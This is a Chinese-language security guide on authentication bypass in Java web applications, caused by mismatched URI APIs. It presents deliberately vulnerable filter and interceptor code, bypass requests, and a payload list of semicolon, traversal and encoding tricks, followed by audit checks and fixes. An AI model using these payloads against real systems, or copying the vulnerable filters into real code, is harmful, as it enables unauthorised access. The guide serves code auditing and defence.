# URI 解析差异导致的鉴权绕过

## 概述

这是 Java Web 应用中最常见的鉴权绕过漏洞根因。不同的 URI 获取 API 对同一请求返回不同结果，当鉴权逻辑和路由逻辑使用不同 API 时，就会产生绕过。

---

## 核心原理

### URI 获取方法对比

| 类别 | API 方法 | 处理行为 | 安全等级 |
|------|----------|----------|----------|
| **Servlet API** | `getRequestURI()` | 原样返回，不做任何处理 | ❌ 危险 |
| | `getRequestURL()` | 原样返回完整URL | ❌ 危险 |
| | `getServletPath()` | 1. 删除`;`后内容<br>2. URL解码<br>3. 路径归一化(`../`) | ✅ 安全 |
| | `getPathInfo()` | 一般返回null | - |
| | `getContextPath()` | 返回应用上下文路径 | ✅ 安全 |
| **Spring** | `UrlPathHelper.getPathWithinApplication()` | 同 getServletPath | ✅ 推荐 |
| | `UrlPathHelper.getOriginatingRequestUri()` | 删除`;` + URL解码 | ✅ 安全 |
| | `ServletRequestPathUtils.getCachedPath()` | 根据配置可能解码或不解码 | ⚠️ 需确认 |
| **Spring MVC** | `HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE` | 返回匹配的Controller路径模式 | ✅ 最安全 |
| | `HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE` | 删除`;` + 不解码URL | ✅ 安全 |

### 请求示例对比

| 原始请求 | getRequestURI() | getServletPath() |
|----------|-----------------|------------------|
| `/api/admin;.js` | `/api/admin;.js` | `/api/admin` |
| `/api/admin;bypass=true` | `/api/admin;bypass=true` | `/api/admin` |
| `/api/%2e%2e/admin` | `/api/%2e%2e/admin` | `/admin` |
| `//api/admin` | `//api/admin` | `/api/admin` |
| `/api/./admin` | `/api/./admin` | `/api/admin` |
| `/public/../admin` | `/public/../admin` | `/admin` |
| `/api/admin%00.jpg` | `/api/admin%00.jpg` | `/api/admin` (可能) |

---

## 漏洞场景

### 场景1：静态资源白名单绕过

**漏洞代码：**

```java
public class AuthFilter implements Filter {
    
    private static final String[] STATIC_SUFFIXES = {".js", ".css", ".png", ".jpg", ".html"};
    
    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) {
        HttpServletRequest request = (HttpServletRequest) req;
        String uri = request.getRequestURI();  // ❌ 危险！
        
        // 静态资源放行
        for (String suffix : STATIC_SUFFIXES) {
            if (uri.endsWith(suffix)) {
                chain.doFilter(req, resp);
                return;
            }
        }
        
        // 鉴权检查...
        if (!isAuthenticated(request)) {
            ((HttpServletResponse) resp).sendError(401);
            return;
        }
        
        chain.doFilter(req, resp);
    }
}
```

**攻击：**

```http
GET /api/admin/users;.js HTTP/1.1
Host: target.com
```

**绕过流程：**
1. `getRequestURI()` 返回 `/api/admin/users;.js`
2. 匹配 `.js` 后缀 → 放行
3. Spring 路由使用 `getServletPath()` 返回 `/api/admin/users`
4. 请求被路由到 AdminController → 鉴权绕过！

---

### 场景2：路径前缀白名单绕过

**漏洞代码：**

```java
public class AuthInterceptor implements HandlerInterceptor {
    
    private static final String[] WHITE_LIST = {"/public/", "/static/", "/login"};
    
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
        String uri = request.getRequestURI();  // ❌ 危险！
        
        for (String path : WHITE_LIST) {
            if (uri.startsWith(path) || uri.contains(path)) {
                return true;  // 放行
            }
        }
        
        // 检查登录状态
        if (request.getSession().getAttribute("user") == null) {
            response.sendRedirect("/login");
            return false;
        }
        
        return true;
    }
}
```

**攻击：**

```http
GET /public/../admin/secret HTTP/1.1
Host: target.com
```

**绕过流程：**
1. `getRequestURI()` 返回 `/public/../admin/secret`
2. `startsWith("/public/")` 匹配成功 → 放行
3. 实际路由到 `/admin/secret` → 鉴权绕过！

---

### 场景3：路径包含判断绕过

**漏洞代码：**

```java
String uri = request.getRequestURI();

// 检查是否为 API 请求
if (uri.contains("/api/")) {
    // 需要鉴权
    checkAuth(request);
} else {
    // 非 API 请求，放行
    chain.doFilter(request, response);
}
```

**攻击：**

```http
GET /%61pi/admin HTTP/1.1
Host: target.com
```

**绕过流程：**
1. `getRequestURI()` 返回 `/%61pi/admin`（`%61` = `a`）
2. `contains("/api/")` 匹配失败 → 放行
3. 实际路由到 `/api/admin` → 鉴权绕过！

---

## 检测清单

### 代码审计检查点

- [ ] Filter/Interceptor 中搜索 `getRequestURI()` 调用
- [ ] 检查是否使用 `getRequestURI()` 的返回值做鉴权判断
- [ ] 检查路径匹配是否使用 `contains()`、`startsWith()`、`endsWith()`
- [ ] 检查是否对路径进行规范化处理
- [ ] 检查白名单路径是否过于宽松

### 危险代码模式

```java
// ❌ 模式1：直接使用 getRequestURI
String uri = request.getRequestURI();
if (uri.endsWith(".js")) { ... }

// ❌ 模式2：使用 contains 判断路径
if (uri.contains("/public/")) { return true; }

// ❌ 模式3：使用 startsWith 但未规范化
if (uri.startsWith("/api/")) { checkAuth(); }

// ❌ 模式4：多条件组合但都基于原始URI
if (uri.startsWith("/static/") || uri.endsWith(".css")) { ... }
```

---

## 验证 PoC

### 分号后缀绕过

```http
# 基础测试
GET /admin;.js HTTP/1.1
GET /admin;.css HTTP/1.1
GET /admin;.png HTTP/1.1
GET /admin;.html HTTP/1.1
GET /admin;.ico HTTP/1.1
GET /admin;.woff HTTP/1.1

# 带参数
GET /admin;bypass=true HTTP/1.1
GET /admin;jsessionid=fake HTTP/1.1

# 前置分号
GET /;/admin HTTP/1.1
GET /;bypass/admin HTTP/1.1
```

### 路径穿越绕过

```http
# 基础穿越
GET /public/../admin HTTP/1.1
GET /static/../api/users HTTP/1.1

# 编码穿越
GET /public/%2e%2e/admin HTTP/1.1
GET /api/%2e%2e/%2e%2e/admin HTTP/1.1

# 双重编码
GET /public/%252e%252e/admin HTTP/1.1
```

### 组合绕过

```http
# 分号 + 路径穿越
GET /public;/../admin HTTP/1.1
GET /static;test/../api/secret HTTP/1.1

# 分号 + 编码
GET /admin%3b.js HTTP/1.1
GET /admin%3Bbypass HTTP/1.1

# 双斜杠 + 分号
GET //admin;.js HTTP/1.1
```

---

## 安全修复建议

### 方案1：使用安全的 URI 获取方法（推荐）

```java
// ✅ 使用 getServletPath()
String path = request.getServletPath();

// ✅ 使用 Spring 的 UrlPathHelper
UrlPathHelper urlPathHelper = new UrlPathHelper();
String path = urlPathHelper.getPathWithinApplication(request);

// ✅ 使用 HandlerMapping 属性（在 Interceptor 中）
String pattern = (String) request.getAttribute(
    HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE);
```

### 方案2：手动规范化路径

```java
public String normalizePath(HttpServletRequest request) {
    String uri = request.getRequestURI();
    
    // 1. 删除分号及其后内容
    int semicolonIndex = uri.indexOf(';');
    if (semicolonIndex != -1) {
        uri = uri.substring(0, semicolonIndex);
    }
    
    // 2. URL 解码
    try {
        uri = URLDecoder.decode(uri, "UTF-8");
    } catch (UnsupportedEncodingException e) {
        // 处理异常
    }
    
    // 3. 路径规范化
    uri = Paths.get(uri).normalize().toString();
    
    // 4. 处理双斜杠
    uri = uri.replaceAll("//+", "/");
    
    return uri;
}
```

### 方案3：使用 Spring Security

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(auth -> auth
            // Spring Security 内部已处理路径规范化
            .requestMatchers("/public/**").permitAll()
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .anyRequest().authenticated()
        );
        return http.build();
    }
}
```

### 方案4：配置 Tomcat 拒绝特殊字符

```xml
<!-- server.xml 或 context.xml -->
<Context>
    <!-- 拒绝包含分号的请求 -->
    <Valve className="org.apache.catalina.valves.RequestFilterValve"
           deny=".*;.*"
           denyStatus="400"/>
</Context>
```

---

## 框架版本注意事项

### Spring Boot

| 版本 | 默认行为 | 注意事项 |
|------|----------|----------|
| < 2.3.0 | 使用 AntPathMatcher | 需手动处理 |
| >= 2.3.0 | 可选 PathPatternParser | 更严格的路径匹配 |
| >= 2.6.0 | 默认 PathPatternParser | 自动拒绝异常路径 |

### Tomcat

| 版本 | 分号处理 | 建议 |
|------|----------|------|
| 7.x | 保留分号参数 | 升级或配置过滤 |
| 8.x | 保留分号参数 | 升级或配置过滤 |
| 9.x+ | 可配置拒绝 | 启用 `rejectIllegalHeader` |

---

## 参考资料

- [先知社区 - SpringMVC的URI解析和权限绕过](https://xz.aliyun.com/news/15899)
- [先知社区 - 基于自定义鉴权的JAVA权限绕过](https://xz.aliyun.com/news/19365)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
